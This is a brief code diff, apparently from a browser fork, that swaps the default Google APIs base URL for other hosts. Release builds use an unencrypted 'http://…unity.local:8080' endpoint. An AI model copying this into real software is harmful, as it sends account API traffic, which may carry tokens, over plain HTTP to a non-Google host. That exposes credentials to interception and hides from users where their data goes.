@@ -25,7 +25,12 @@ namespace {
 // Gaia service constants
 const char kDefaultGoogleUrl[] = "http://google.com";
 const char kDefaultGaiaUrl[] = "https://accounts.google.com";
-const char kDefaultGoogleApisBaseUrl[] = "https://www.googleapis.com";
+#if defined(NDEBUG)
+const char kDefaultGoogleApisBaseUrl[] = "http://urdp.unity.local:8080";
+#else
+const char kDefaultGoogleApisBaseUrl[] = "https://urdp.unity.cn";
+#endif
+
 const char kDefaultOAuthAccountManagerBaseUrl[] =
     "https://oauthaccountmanager.googleapis.com";
 
